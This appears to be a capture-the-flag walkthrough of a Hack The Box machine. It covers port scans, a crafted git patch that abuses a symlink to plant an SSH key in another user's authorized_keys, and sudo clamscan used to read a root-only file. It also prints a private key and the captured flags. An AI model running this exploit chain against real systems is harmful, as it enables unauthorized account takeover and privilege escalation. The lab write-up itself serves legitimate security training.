~~~
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.219.154 -oG allPorts 
~~~

~~~

sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.219.154 -oG allPorts 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 00:38 IST
Initiating SYN Stealth Scan at 00:38
Scanning 10.129.219.154 [65535 ports]
Discovered open port 22/tcp on 10.129.219.154
Discovered open port 53/tcp on 10.129.219.154
Discovered open port 80/tcp on 10.129.219.154
Completed SYN Stealth Scan at 00:38, 14.09s elapsed (65535 total ports)
Nmap scan report for 10.129.219.154
Host is up, received user-set (0.23s latency).
Scanned at 2023-05-07 00:38:33 IST for 14s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds
           Raw packets sent: 68336 (3.007MB) | Rcvd: 68103 (2.724MB)

~~~

~~~
nmap -p 22,80,53 -sCV 10.129.219.154 -oN targeted
~~~

~~~
┌─[mr_g0d@parrot]─[/media/mr_g0d/MR_G0D(500G/GOD/HTB/MACHINES/snoopy]
└──╼ $nmap -p 22,80,53 -sCV 10.129.219.154 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-07 00:40 IST
Nmap scan report for 10.129.219.154
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ee6bcec5b6e3fa1b97c03d5fe3f1a16e (ECDSA)
|_  256 545941e1719a1a879c1e995059bfe5ba (ED25519)
53/tcp open  domain  ISC BIND 9.18.12-0ubuntu0.22.04.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.18.12-0ubuntu0.22.04.1-Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: SnoopySec Bootstrap Template - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.96 seconds
~~~


SSH CREDENTIALS:

~~~
ssh-keygen -f id
~~~

![[ssh key gen.png]]

![[cat id .png]]

Now we have both id and id.pub

cat id

~~~
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
~~~

cat id.pub
~~~
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCXDbdyNEORCTI4X0/N1271p1Adiq2y0n5EzVIoeTfs+MLeuGwdYfJUbZW0alkjR7J0v+dy0Ya+hjQ67Zkaewff4Xq+q+JNEmI0jj5gAbP/cLU/T04dpai4xUhW3IV5jC+Ktc0kYPMw2ww6HnzomxHPh5thlxzN1v9aXIFVPrkSsJbWkS1lY3cyj2PZYdsd57lkY+zwhAX3sBsgw0KNpowXEvzMozatib3fbwjJKVZyaOZi/MBUTBRQPaXhABZyRUV7ExsvoHR+57hyRpszdNkG8DpseqiNwD9HejIMqatoJzgSIMUjH18sm4suDfQmS6Ak/AltYV4xv5FnRQ4kIE5x0kDaadll1mVnRYelf2GyLEYH/xVl/bn5+FVzasVxVUQQIKOQ/o6x1qJU++cHIZb2VoorkxpOGnO4uflu4YXTYMhEkYAidj4YyJganOdQQPqT/0Vp4aRF8zho4eq21zfX6Imv2QoUkrSfI3jwPtHsfL3RQkwH78kavEAzle257M= mr_g0d@parrot
~~~

**cat patch **

On our machine , create a patch file...

~~~
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/create-me
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCXDbdyNEORCTI4X0/N1271p1Adiq2y0n5EzVIoeTfs+MLeuGwdYfJUbZW0alkjR7J0v+dy0Ya+hjQ67Zkaewff4Xq+q+JNEmI0jj5gAbP/cLU/T04dpai4xUhW3IV5jC+Ktc0kYPMw2ww6HnzomxHPh5thlxzN1v9aXIFVPrkSsJbWkS1lY3cyj2PZYdsd57lkY+zwhAX3sBsgw0KNpowXEvzMozatib3fbwjJKVZyaOZi/MBUTBRQPaXhABZyRUV7ExsvoHR+57hyRpszdNkG8DpseqiNwD9HejIMqatoJzgSIMUjH18sm4suDfQmS6Ak/AltYV4xv5FnRQ4kIE5x0kDaadll1mVnRYelf2GyLEYH/xVl/bn5+FVzasVxVUQQIKOQ/o6x1qJU++cHIZb2VoorkxpOGnO4uflu4YXTYMhEkYAidj4YyJganOdQQPqT/0Vp4aRF8zho4eq21zfX6Imv2QoUkrSfI3jwPtHsfL3RQkwH78kavEAzle257M= mr_g0d@parrot

~~~

later start the python3 server

~~~
sudo python3 -m http.server 80
~~~


Before that ,

create dir repo,

~~~
mkdir repo
~~~

~~~]]
cd repo
~~~

~~~
chmod 777 /home/cbrown
~~~

~~~
chmod 777 /home/cbrown/repo/
~~~

**On victim machine,**

~~~
wget http://<IP>/patch

~~~

~~~
git init
~~~

~~~
ln -s /home/sbrown/.ssh symlink
~~~

~~~
sudo -u sbrown /usr/bin/git apply patch
~~~


Now , on our machine try to login with SSH,

sudo ssh -i id sbrown@IP

Got  user flag , 

~~~
sbrown@snoopy:~$ ls
user.txt
sbrown@snoopy:~$ cat user.txt 
f950c08faad77ebb0bf1d5b77e831c91
~~~


before that , dont forgot to give permission 


~~~
chmod 600 id
~~~

later , 

For root flag 

simple...!!!

~~~
sudo -l
~~~

~~~
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan
~~~

 Reference link : https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-clamav-privilege-escalation/

DNS - https://serverless.industries/2020/09/27/dns-nsupdate-howto.en.html
 
~~~
sbrown@snoopy:~$ sudo /usr/local/bin/clamscan -f /root/root.txt
LibClamAV Warning: **************************************************
LibClamAV Warning: ***  The virus database is older than 7 days!  ***
LibClamAV Warning: ***   Please update it as soon as possible.    ***
LibClamAV Warning: **************************************************
Loading:    22s, ETA:   0s [========================>]    8.66M/8.66M sigs       
Compiling:   6s, ETA:   0s [========================>]       41/41 tasks 

00a7f020a62cbe20dfa81c2e7bfb1626: No such file or directory
WARNING: 00a7f020a62cbe20dfa81c2e7bfb1626: Can't access file

----------- SCAN SUMMARY -----------
Known viruses: 8659055
Engine version: 1.0.0
Scanned directories: 0
Scanned files: 0
Infected files: 0
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 30.681 sec (0 m 30 s)
Start Date: 2023:05:07 18:22:06
End Date:   2023:05:07 18:22:37

~~~

~~~
root flag : 00a7f020a62cbe20dfa81c2e7bfb1626
~~~